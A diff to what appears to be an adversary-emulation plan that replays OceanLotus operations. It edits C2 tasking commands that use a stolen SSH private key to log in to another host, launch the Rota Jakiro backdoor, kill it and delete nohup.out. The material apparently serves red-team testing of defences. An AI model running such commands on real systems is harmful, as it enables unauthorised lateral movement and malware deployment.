@@ -130,7 +130,7 @@ p/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
 
 Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
 ```
-./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'
+./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup ./rota&2>/dev/null; sleep 3; pkill rota; rm nohup.out;\""}'
 ```
 
 Confirm C2 Registration of Rota on the C2 Server
@@ -149,7 +149,7 @@ Upload device info
 
 ---
 ### :biohazard: Procedures
-`./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'`
+`./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup ./rota&2>/dev/null; sleep 3; pkill rota; rm nohup.out;\""}'`
 
 Confirm device info is printed out
 
